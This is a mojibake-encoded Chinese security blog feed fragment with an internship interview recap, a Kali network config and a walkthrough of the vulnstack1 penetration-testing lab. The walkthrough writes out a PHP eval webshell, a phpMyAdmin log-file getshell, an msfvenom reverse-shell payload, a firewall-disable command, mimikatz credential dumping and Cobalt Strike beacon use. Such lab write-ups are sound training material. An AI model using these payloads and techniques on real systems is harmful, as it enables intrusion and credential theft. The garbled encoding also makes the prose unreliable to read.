<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket2.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡é•¿äº­å®‰å…¨ç ”ç©¶å‘˜å®ä¹ ç”Ÿé¢è¯•çš„ç»å†</title>
    <url>/posts/e38ec14f/</url>
    <content><![CDATA[<p>å‰è¨€:è¿™ä¸ªæ˜¯åœ¨bossä¸Šhræ˜¨å¤©è”ç³»çš„æˆ‘ï¼Œç„¶åä»Šå¤©ä¸‹åˆé€šçŸ¥æˆ‘æ™šä¸Šè¿›è¡Œé¢è¯•â€¦è¯´çš„ä¸»è¦æ˜¯ç ”ç©¶æ¯”èµ›ä¹‹ç±»çš„ï¼Œæˆ‘è¯´è¿™ä¸ªæˆ‘ä¸æ˜¯å¾ˆæ“…é•¿ï¼Œç„¶åå°±å°è¯•ä¸€ä¸‹å§</p>
<hr>
<p>1.è‡ªæˆ‘ä»‹ç»</p>
<p>2.ä¸ªäººè§„åˆ’</p>
<p>3.è¿‘æœŸå‚åŠ çš„æ¯”èµ›ï¼Œå¾—è¿‡ä»€ä¹ˆæˆç»©å—</p>
<p>4.ä½ è®¤ä¸ºä»€ä¹ˆæ˜¯ä¸€é“ä¼˜ç§€çš„é¢˜ç›®</p>
<p>å›ç­”çš„ä¸»è¦æ„æ€å°±æ˜¯å¸Œæœ›é¢˜ç›®æ›´è´´è¿‘äºå®é™…ç¯å¢ƒ</p>
<p>5.æ—¶é—´ç›²æ³¨ç”¨åˆ°çš„å‡½æ•°æœ‰å“ªäº›ï¼Ÿå¦‚æœsleepè¢«ç¦ç”¨äº†è¿˜æœ‰ä»€ä¹ˆå‡½æ•°å¯ä»¥æ›¿ä»£</p>
<p>if sleep substr ï¼Œé—®sleepçš„æ›¿ä»£å‡½æ•°æ—¶æ²¡æƒ³åˆ°ï¼Œä¹‹å‰æ²¡æ¥è§¦è¿‡ç„¶åæŸ¥äº†ä¸‹æ˜¯<code>benchmark</code></p>
<p>6.ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥</p>
<p>ç¬¬ä¸€æ¬¡æ³¨å…¥åæ•°æ®ä¸­å­˜åœ¨è„æ•°æ®ï¼Œç„¶åå†æ¬¡è°ƒç”¨æ—¶æ²¡æœ‰å¯¹å­˜åœ¨è„æ•°æ®çš„æ•°æ®è¿›è¡Œæ£€æµ‹ï¼Œæ‰§è¡Œäº†æ•°æ®åº“å‘½ä»¤ï¼Œä»è€Œä½¿é€ æˆäº†æ•°æ®åº“çš„æ³¨å…¥</p>
<p>7.äº†è§£ååºåˆ—åŒ–å—ï¼Œè¯´ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´çš„åŸç†</p>
<p>ååºåˆ—åŒ–å°±æ˜¯å°†å­—ç¬¦æ•°æ®è½¬æ¢ä¸ºå¯¹è±¡è¿›è¡Œå­˜å‚¨ï¼Œç„¶åå†ååºåˆ—åŒ–çš„</p>
<p>ä¹‹å‰æ¥è§¦è¿‡shiroååºåˆ—åŒ–ï¼Œfastjosnï¼Œweblogic</p>
<p>æ‹¿shiroååºåˆ—åŒ–ä¸¾ä¾‹å­ï¼Œshiroçš„RememberMeå­—æ®µçš„å€¼ä¼šå…ˆè¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åå†è¿›è¡ŒAESåŠ å¯†ï¼Œåœ¨è¿›è¡Œbase64åŠ å¯†ã€‚ç›¸å¯¹çš„ï¼Œè§£å¯†è¿‡ç¨‹åˆ™æ˜¯å…ˆå¯¹RememberMeçš„å€¼è¿›è¡Œbase64è§£å¯†ï¼ŒAESè§£å¯†ï¼Œååºåˆ—åŒ–ã€‚é‚£ä¹ˆå¯ä»¥å°†æ„é€ æ¶æ„ä»£ç çš„è¯­å¥æ”¾åˆ°Shiroçš„Cookie RememberMeä¸­ï¼Œè¢«shiroæœåŠ¡å™¨è¿›è¡Œè§£ææ—¶ï¼Œä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œä»è€Œé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>8.è¯´ä¸€ä¸‹ä½ å°è±¡è¾ƒæ·±çš„é¢˜ç›®</p>
<p>æˆ‘è¯´äº†ä¸‹ä¹‹å‰4æœˆä»½æœ‰æ¥è§¦è¿‡sstiï¼Œä½†æ˜¯é—®æˆ‘sstiçš„åŸç†çš„æ—¶å€™å°±æƒ³ä¸å‡ºæ¥äº†â€¦(åœ¨ä¸æ­£ç¡®ä½¿ç”¨æ¨¡æ¿å¼•æ“è¿›è¡Œæ¸²æŸ“æ—¶ï¼Œä¼šé€ æˆæ¨¡æ¿æ³¨å…¥)</p>
<p>9.XSSåˆ†ç±»ï¼Œè¯´ä¸€ä¸‹å¼¹xssçš„è¯­å¥æœ‰å“ªäº›?</p>
<p>åå°„å‹ï¼Œå­˜å‚¨å‹ï¼ŒDOMå‹</p>
<p>ç„¶åæˆ‘å°±è¯´äº†å¯ä»¥ç”¨script JavaScript frame ä¹‹ç±»çš„ï¼Œç„¶åå¸ˆå‚…è®©æˆ‘è¯´ä¸‹å…·ä½“çš„å†™æ³•ï¼Œç„¶åå°±ç®€å•è¯´äº†ä¸‹ï¼Œå¸ˆå‚…è¯´è¿™æ ·å†™çš„è¯å¤§å¤šæ•°æ˜¯æ— æ³•æ‰§è¡Œçš„</p>
<p>10.csrfå’Œssrfå“ªä¸ªå±å®³æ›´å¤§ä¸€äº›ï¼Ÿssrfè¯¥å¦‚ä½•é˜²å¾¡</p>
<p>ssrfå¯ä»¥å†…å®¹è¯»å–ï¼Œæ¢æµ‹å†…ç½‘ï¼›csrfå¯ä»¥ç›—å–cookieï¼Œç„¶åæˆ‘è¯´åº”è¯¥æ˜¯csrfå§ï¼ˆè™½ç„¶çŸ¥é“ä»–ä»¬çš„ä½œç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯æ‹¿ä¸å®šä¸»æ„ï¼‰ç„¶åå¸ˆå‚…æœ‰é—®äº†ä¸‹æ‰ç¡®å®šæ˜¯ssrfå±å®³å¤§ã€‚</p>
<p>ç„¶åé—®ssrfå¦‚ä½•é˜²å¾¡</p>
<p>11.æ³„æ¼ç±»é¢˜ç›®æœ‰æ¥è§¦è¿‡å—ï¼Œæ¥è§¦è¿‡å“ªäº›</p>
<p>å½“æ—¶åªæƒ³åˆ°äº†gitæ³„æ¼ï¼Œé¢è¯•å®Œçªç„¶æƒ³åˆ°äº†svnæ³„æ¼å’ŒDS_storeæ³„æ¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.hgæºç æ³„æ¼</span><br><span class="line">.gitæºç æ³„éœ²</span><br><span class="line">.DS_Storeæ³„æ¼</span><br><span class="line">svnæ³„æ¼</span><br></pre></td></tr></table></figure>

<p>12.æœ‰ä»€ä¹ˆé—®é¢˜è¦æé—®å—</p>
<p>å½“æ—¶åªæƒ³åˆ°äº†åˆšæ‰é—®çš„sleepå‡½æ•°çš„æ›¿ä»£å‡½æ•°â€¦.åˆ«çš„éƒ½æƒ³ä¸èµ·æ¥äº†ï¼Œå¤§è„‘ä¸€ç‰‡ç©ºç™½â€¦â€¦.</p>
<br>

<hr>
<p>æ„Ÿè§‰åº”è¯¥æ˜¯å‡‰å‡‰äº†ï¼Œé¢è¯•æŒºçªç„¶çš„ï¼Œæ²¡åšå•¥å‡†å¤‡ï¼Œè€Œä¸”è¿™ä¸ªå®ä¹ æ˜¯æ¯”èµ›æ–¹é¢çš„ï¼Œä½œä¸ºç­¾åˆ°å‹é€‰æ‰‹å‡ ç‡æ›´æ¸ºèŒ«äº†â€¦wuwuwuâ€¦.å…ˆæŠŠçº¢æ—¥é¶åœºæå®Œï¼Œå¥½å¥½å‡†å¤‡ç§‹æ‹›äº†ï¼</p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>kalié…ç½®åŒç½‘å¡</title>
    <url>/posts/47c05aa1/</url>
    <content><![CDATA[<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo  vim /etc/network/interfaces</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.128</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.2</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet static</span><br><span class="line">address 192.168.72.130</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">//ä¿å­˜å</span><br><span class="line">sudo service networking  restart     </span><br><span class="line">ifconfig</span><br><span class="line">reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack1é¶åœº</title>
    <url>/posts/bb76ba56/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali        VM2,NAT             192.168.72.130,192.168.0.128</span><br><span class="line">win7        VM2,VM1,NAT         192.168.52.143,192.168.72.129,192.168.0.178</span><br><span class="line">win2k3      VM1                 192.168.52.141</span><br><span class="line">winServer08 VM1                 192.168.52.138</span><br></pre></td></tr></table></figure>

<p>é€šç”¨å¯†ç ä¸º <code>hongrisec@2019</code> æ›´æ”¹åçš„å¯†ç ä¸º<code>hongrisec@2021</code></p>
<p>win7å¯ä»¥pingé€šæ‰€æœ‰ä¸»æœºï¼Œä½†æ‰€æœ‰ä¸»æœºéƒ½æ— æ³•pingé€šwin7(win7é˜²ç«å¢™è¿‡æ»¤äº†icmp,å¼€å¯æ–‡ä»¶å’Œæ‰“å°æœºå›æ˜¾ imcpv4å³å¯pingé€š)</p>
<p>win2003ä¸win2008äº’é€š</p>
<p>(ä¹‹å‰é€‰æ‹©win7ç½‘ç»œæ˜¯é€‰æˆäº†å®¶åº­ç½‘ç»œå¯¼è‡´æ— æ³•åœ¨å…¶ä»–ä¸»æœºè®¿é—®webæœåŠ¡ï¼Œæ”¹ä¸ºå…¬ç”¨ç½‘ç»œå°±iå¥½äº†;ä½¿ç”¨VM1å’ŒNatæ¨¡å¼çš„win7åŸŸé…ç½®æœ‰ç‚¹é—®é¢˜ï¼Œç„¶åå°±åœ¨åé¢å†…ç½‘æ¸—é€çš„æ—¶å€™é‡æ–°è®¾ç½®äº†ï¼Œç»™kaliå’Œwin7é…ç½®äº†VM2ç½‘å¡)</p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><code>nmap 192.168.0.178 -sS -Pn</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-13 20:31 CST</span><br><span class="line">Nmap scan report for 192.168.0.178</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:63:00:E0 (VMware)</span><br></pre></td></tr></table></figure>

<p>å¼€æ”¾äº†80ç«¯å£ å’Œ 3306ç«¯å£</p>
<p>è®¿é—®80ç«¯å£ï¼Œé»˜è®¤é¡µé¢ä¸ºphpstudyæ¢é’ˆï¼Œå¾—åˆ°ç½‘ç«™ç»å¯¹è·¯å¾„ä¸º<code>C:/phpStudy/WWW </code> è¿˜æœ‰ä¸€ä¸ªmysqlæ•°æ®åº“è¿æ¥æ£€æµ‹ï¼Œè¾“å…¥root,root æ˜¾ç¤ºæˆåŠŸè¿æ¥æ•°æ®åº“,å¯ä»¥ç¡®å®šå¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ä¸º <code>root</code>  <code>root</code></p>
<h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p><code>sudo dirb http://192.168.0.178</code>  dirmapåªæ‰«æå‡ºäº†phpmyadmin</p>
<p><code>sudo python3 dirsearch.py -u http://192.168.0.178 -e */</code> dirsearchä¹Ÿåªæ‰«å‡ºæ¥äº†phpmyadmin</p>
<p><code>sudo python3 dirmap.py  -i 192.168.0.178 -lcf</code> ä½¿ç”¨dirmap æ‰«åˆ°äº†å¤‡ä»½æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[200][application/x-rar-compressed][3.00mb] http://192.168.0.178/beifen.rar         </span><br><span class="line">[200][text/html][70.39kb] http://192.168.0.178/phpinfo.php                          </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpMyAdmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpMyadmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpmyadmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpmyAdmin/            </span><br><span class="line">[200][text/html; charset=utf-8][14.39kb] http://192.168.0.178//l.php  </span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="åå°ä¸Šä¼ shell"><a href="#åå°ä¸Šä¼ shell" class="headerlink" title="åå°ä¸Šä¼ shell"></a>åå°ä¸Šä¼ shell</h4><p>ä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œå‘ç°ä¸ºyxcms</p>
<p>è®¿é—® <code>192.168.0.178/yxcms</code>,ä¸»é¡µä¸­æœ‰æ•æ„Ÿä¿¡æ¯æ³„æ¼</p>
<p><img src="/posts/bb76ba56/info.png"></p>
<p>å¾—åˆ°åå°åœ°å€å’Œç™»å½•è´¦å·</p>
<p>åœ¨å‰å°æ¨¡æ¿å¤„ï¼Œå¯ä»¥æ–°å¢phpæ–‡ä»¶,åˆ›å»ºä¸€ä¸ªshell1.php</p>
<p><img src="/posts/bb76ba56/shell1php.png"></p>
<p>é€šè¿‡ä¹‹å‰ä¸‹è½½çš„å¤‡ä»½æ–‡ä»¶æ‰¾ä¸€ä¸‹shell1.phpçš„æ–‡ä»¶è·¯å¾„</p>
<p><img src="/posts/bb76ba56/sehll1dir.png"></p>
<p>æ‰¾åˆ°shellçš„æ–‡ä»¶è·¯å¾„ä¸º<code>yxcms/protected/apps/default/view/default/</code></p>
<p>è®¿é—®<code>http://192.168.0.178/yxcms/protected/apps/default/view/default/shell1.php?cmd=phpinfo();</code>æˆåŠŸä¸Šä¼ shell</p>
<p><img src="/posts/bb76ba56/shell_phpinfo.png"></p>
<p>ä½¿ç”¨èšå‰‘è¿æ¥shell</p>
<p><img src="/posts/bb76ba56/ant_shell.png"></p>
<h4 id="phpmyadminåˆ©ç”¨æ—¥å¿—Getshell"><a href="#phpmyadminåˆ©ç”¨æ—¥å¿—Getshell" class="headerlink" title="phpmyadminåˆ©ç”¨æ—¥å¿—Getshell"></a>phpmyadminåˆ©ç”¨æ—¥å¿—Getshell</h4><p>å¼±å£ä»¤<code>root</code>  <code>root</code>æˆåŠŸç™»å½•</p>
<p>æŸ¥çœ‹æ˜¯å¦æœ‰å†™å…¥æƒé™ <code>show variables like &#39;%secure_file%&#39;;</code></p>
<p>secure_file_priv å€¼ä¸º NULLï¼Œä¸èƒ½ä½¿ç”¨ into outfile æ–¹å¼å†™å…¥ shell</p>
<p><img src="/posts/bb76ba56/phpmy1.png"></p>
<p>æ‰‹åŠ¨å¼€å¯æ—¥å¿—è®°å½•</p>
<p><img src="/posts/bb76ba56/phpmy2.png"></p>
<p>æŸ¥çœ‹å½“å‰æ—¥å¿—ç›®å½•</p>
<p><img src="/posts/bb76ba56/phpmy3.png"></p>
<p>æŒ‡å®šæ—¥å¿—æ–‡ä»¶</p>
<p><code>set global general_log_file = &quot;C:/phpStudy/www/1.php&quot;;</code></p>
<p>å†æ¬¡æŸ¥çœ‹æ—¥å¿—ç›®å½•</p>
<p><code>show variables like &#39;general%&#39;;</code></p>
<p><img src="/posts/bb76ba56/phpmy4.PNG"></p>
<p>å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥æŒ‡å®šçš„1.php</p>
<p><code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code></p>
<p><img src="/posts/bb76ba56/phpmy5.PNG"></p>
<p><img src="/posts/bb76ba56/phpmy6.PNG"></p>
<h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><h4 id="ä½¿ç”¨msf"><a href="#ä½¿ç”¨msf" class="headerlink" title="ä½¿ç”¨msf"></a>ä½¿ç”¨msf</h4><p>æ‰“å¼€msfè¿›è¡Œæœ¬æœºç›‘å¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.72.130</span><br><span class="line">set lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨msfvenomç”Ÿæˆshell.exe</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.72.130 lport=9999 -f exe -o shell.exe</code></p>
<p>ç„¶åä½¿ç”¨èšå‰‘ä¸Šä¼ shell.exeåæ‰§è¡Œ</p>
<p>æˆåŠŸåœ¨msfä¸Šæ”¶åˆ°åå¼¹shell</p>
<p><img src="/posts/bb76ba56/msf_shell.png"></p>
<p><code>getuid</code>æŸ¥çœ‹å½“å‰æƒé™</p>
<p>ä½¿ç”¨<code>getsystem</code>æˆåŠŸææƒ</p>
<p><img src="/posts/bb76ba56/msf_getsystem.png"></p>
<p>ä½¿ç”¨<code>sysinfo</code>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</p>
<p><img src="/posts/bb76ba56/msf_sysinfo.png"></p>
<p>ä½¿ç”¨<code>ps</code>æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹,æ‰¾ä¸€ä¸ªx64çš„è¿›ç¨‹ï¼Œç”¨æˆ·ä¸º<code>NT AUTHORITY\SYSTEM</code>,è¿™æ ·è¿ç§»åmeterpreterçš„æƒé™æ˜¯è¿ç§»åˆ°çš„è¿›ç¨‹çš„æƒé™ï¼Œåœ¨æ­¤æ¬¡é€‰æ‹©ä½¿ç”¨idä¸º400çš„è¿›ç¨‹è¿›è¡Œè¿ç§»</p>
<p><img src="/posts/bb76ba56/msf_ps.png"></p>
<p><img src="/posts/bb76ba56/msf_migrate400.png"></p>
<p>ä½¿ç”¨<code>getpid</code> æŸ¥çœ‹å½“å‰Meterpreter Shellçš„è¿›ç¨‹PID</p>
<p>åŠ è½½mimikatzæ¨¡å—<code>load mimikatz</code></p>
<p><img src="/posts/bb76ba56/msf_loadmimikatz_error.png"></p>
<p>æ ¹æ®æç¤ºï¼Œmimikatzæ¨¡å—å·²ç»è¢«kiwiæ‰€å–ä»£</p>
<p>ä½¿ç”¨<code>help kiwi</code>å¯ä»¥æŸ¥çœ‹å¸®åŠ©</p>
<p>åœ¨ä½¿ç”¨wikiçš„æ—¶å€™éœ€è¦å…ˆè¿ç§»è¿›ç¨‹ä¸ç„¶ä¼šæ— æ³•æ­£å¸¸è¿è¡Œ</p>
<p><img src="/posts/bb76ba56/msf_kiwi_nomigrate.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help kiwi</span><br><span class="line"></span><br><span class="line">creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ®</span><br><span class="line">creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®</span><br><span class="line">creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ®</span><br><span class="line">creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ®</span><br><span class="line">creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®</span><br><span class="line">creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®</span><br><span class="line">dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯</span><br><span class="line">dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID</span><br><span class="line">golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ®</span><br><span class="line">kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ®</span><br><span class="line">kiwi_cmdï¼šæ‰§è¡Œmimikatzçš„å‘½ä»¤ï¼Œåé¢æ¥mimikatz.exeçš„å‘½ä»¤</span><br><span class="line">lsa_dump_samï¼šdumpå‡ºlsaçš„SAM</span><br><span class="line">lsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡</span><br><span class="line">password_changeï¼šä¿®æ”¹å¯†ç </span><br><span class="line">wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶</span><br><span class="line">wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>creds_all</code> å‘½ä»¤ç›´æ¥è·å–å¯†ç </p>
<p><img src="/posts/bb76ba56/msf_kiwi_creds_all.png"></p>
<p>ä½¿ç”¨<code>kiwi_cmd</code>åé¢æ¥mimikatz.exeçš„å‘½ä»¤</p>
<p><code>kiwi_cmd sekurlsa::logonpasswords</code>å¯ä»¥å¾—åˆ°å¯†ç <code>hongrisec@2021</code></p>
<p><img src="/posts/bb76ba56/msf_kiwi_cmd.png"></p>
<p>è¿›å…¥shell <code>netstat -ano | findstr &quot;3389&quot;</code>æŸ¥çœ‹3389ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œshellçªç„¶æ²¡äº†ç›¸åº”â€¦ç„¶åå‘ç°é¶æœºipè‡ªåŠ¨å˜äº†..</p>
<p>ä½¿ç”¨msfå¼€å¯3389ç«¯å£</p>
<p>meterpreter &gt;<code> run post/windows/manage/enable_rdp</code></p>
<p><img src="/posts/bb76ba56/msf_run_rdp.png"></p>
<p>(æ³¨ï¼šè¿è¡Œå®Œè¯¥å‘½ä»¤åçªç„¶å‘ç°è¿æ¥ä¸ä¸Šshelläº†ï¼Œå»é¶æœºçœ‹äº†ä¸‹ ç½‘å¡å¼€å¯çš„è‡ªåŠ¨è·å–ipï¼Œæ‰“å¼€3389ä¹‹åä¸çŸ¥é“ä¸ºä»€ä¹ˆå°±è‡ªå·±æ¢äº†ipï¼Œç„¶åå°±åœ¨é¶æœºä¸Šè®¾ç½®äº†å›ºå®šip ä¸º <code>192.168.72.136</code>)</p>
<p>ç„¶åå†kaliä¸Šå°è¯•è¿œç¨‹è¿æ¥é¶æœº</p>
<p><code>sudo rdesktop 192.168.72.136</code> è¾“å…¥yes</p>
<p>ä½¿ç”¨<code>God\Administrator </code> <code>hongrisec@2021</code>æˆåŠŸç™»å½•</p>
<p><img src="/posts/bb76ba56/msf_rdesktop.png"></p>
<hr>
<h4 id="ä½¿ç”¨CSè¿æ¥"><a href="#ä½¿ç”¨CSè¿æ¥" class="headerlink" title="ä½¿ç”¨CSè¿æ¥"></a>ä½¿ç”¨CSè¿æ¥</h4><p>åœ¨CSä¸­åˆ›å»ºbeacon httpç›‘å¬ï¼Œ</p>
<p>ç„¶åé€‰æ‹©æ”»å‡»-&gt;ç”Ÿäº§åé—¨-&gt;Windows Executable(s),é€‰æ‹©åˆšæ‰åˆ›å»ºçš„Listenerç”Ÿæˆ1.exe</p>
<br>

<p>åœ¨èšå‰‘ä¸­å…³é—­é˜²ç«å¢™</p>
<p><code>netsh advfirewall set allprofiles state off</code></p>
<p>å°†ç”Ÿæˆçš„exeåœ¨èšå‰‘ç»ˆç«¯è¿è¡Œ</p>
<p>åœ¨Cobalt Strikeä¸­å®ƒçš„å¿ƒè·³é»˜è®¤æ˜¯60s(å³sleepæ—¶é—´ä¸º60sï¼Œæ¯ä¸€åˆ†é’Ÿç›®æ ‡ä¸»æœºä¸teamserveré€šä¿¡ä¸€æ¬¡), è¿™ä¼šè®©æ‰§è¡Œå‘½ä»¤æˆ–è¿›è¡Œå…¶ä»–æ“ä½œå“åº”å¾ˆæ…¢</p>
<p><code>sleep 5</code> è®¾ç½®æ—¶é—´ä¸º5sï¼Œå¦‚æœè®¾ç½®å€¼è¿‡å°ï¼Œæµé‡ä¼šå¾ˆæ˜æ˜¾ ã€‚</p>
<h5 id="ç³»ç»Ÿä¿¡æ¯æ”¶é›†"><a href="#ç³»ç»Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯æ”¶é›†"></a>ç³»ç»Ÿä¿¡æ¯æ”¶é›†</h5><p><code>shell whoami</code></p>
<p><code>shell net user</code></p>
<p><img src="/posts/bb76ba56/wininfo1.png"></p>
<p><code>shell net user /domain</code></p>
<p><img src="/posts/bb76ba56/shell_net_user_domain.png"></p>
<p><code>shell ipconfig /all</code></p>
<p><img src="/posts/bb76ba56/wininfo2.PNG"></p>
<p><img src="/posts/bb76ba56/wininfo3.PNG"></p>
<p><code>shell systeminfo </code></p>
<p><img src="/posts/bb76ba56/cs_shellsysteminfo.png"></p>
<p><img src="/posts/bb76ba56/cs_shellsysteminfo2.PNG"></p>
<p><code>shell net view</code></p>
<blockquote>
<p>net view å‘½ä»¤å‡ºç°6118é”™è¯¯è§£å†³æ–¹æ³•:å…³é—­é˜²ç«å¢™</p>
<p>netsh advfirewall set allprofiles state off</p>
</blockquote>
<p><img src="/posts/bb76ba56/cs_shellnetview.png"></p>
<p>æŸ¥çœ‹ä¸»åŸŸä¿¡æ¯ <code>shell net view /domain</code></p>
<p><img src="/posts/bb76ba56/cs_netview_domain.png"></p>
<p>æŸ¥çœ‹æ—¶é—´ <code>net time /domain</code></p>
<p><img src="/posts/bb76ba56/net_view_time_domain.png"></p>
<p>æŸ¥è¯¢å½“å‰çš„ç™»å½•åŸŸä¸ç”¨æˆ·ä¿¡æ¯<code>net config workstation</code></p>
<p><img src="/posts/bb76ba56/net_config_workstation.png"></p>
<p>æ‰§è¡ŒCSä¸­çš„<code>net view</code></p>
<p><img src="/posts/bb76ba56/cs_netview.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸŸ: god.org</span><br><span class="line">åŸŸå†…ä¸»æœº: OWA   192.168.52.138</span><br><span class="line">          ROOT-TVI862UBEH   192.168.52.141</span><br><span class="line">          STU1(win7)  192.168.52.143</span><br><span class="line">åŸŸå†…ç”¨æˆ·: Administrator</span><br><span class="line">          ligang</span><br><span class="line">          liukaifeng01</span><br><span class="line">åŸŸæ§: OWA 192.168.52.138</span><br></pre></td></tr></table></figure>

<h5 id="ç³»ç»Ÿå¯†ç æ”¶é›†"><a href="#ç³»ç»Ÿå¯†ç æ”¶é›†" class="headerlink" title="ç³»ç»Ÿå¯†ç æ”¶é›†"></a>ç³»ç»Ÿå¯†ç æ”¶é›†</h5><p>åœ¨CSä¸­ä½¿ç”¨<code>hashdump</code>   <code>logonpasswords</code>  è¯»å–å†…å­˜å’Œå¯†ç </p>
<p><img src="/posts/bb76ba56/password1.png"></p>
<p>å¾—åˆ°hashå€¼å’Œæ˜æ–‡å¯†ç ï¼Œå¯†ç ä¸º <code>hongrisec@2021</code></p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨CSä¸­çš„<code>Run mimikatz</code></p>
<p><img src="/posts/bb76ba56/run_mimikatz.png"></p>
<p>æŠ“åˆ°çš„ç»“æœå¯ä»¥åœ¨<code>View -&gt;  Credentials</code>ä¸­æŸ¥çœ‹</p>
<p><img src="/posts/bb76ba56/Credentials.png"></p>
<br>

<h5 id="æ¨ªå‘æ¢æµ‹"><a href="#æ¨ªå‘æ¢æµ‹" class="headerlink" title="æ¨ªå‘æ¢æµ‹"></a>æ¨ªå‘æ¢æµ‹</h5><p>ä½¿ç”¨CSä¸­çš„<code>net view</code>å’Œ<code>port scan</code> åŠŸèƒ½</p>
<p><img src="/posts/bb76ba56/cs_netview.png"></p>
<p><img src="/posts/bb76ba56/cs_portscan.png"></p>
<p>æ‰«æå‡ºæ¥çš„å†…å®¹å¯ä»¥åœ¨targetä¸­çœ‹åˆ°</p>
<p><img src="/posts/bb76ba56/cs_target.png"></p>
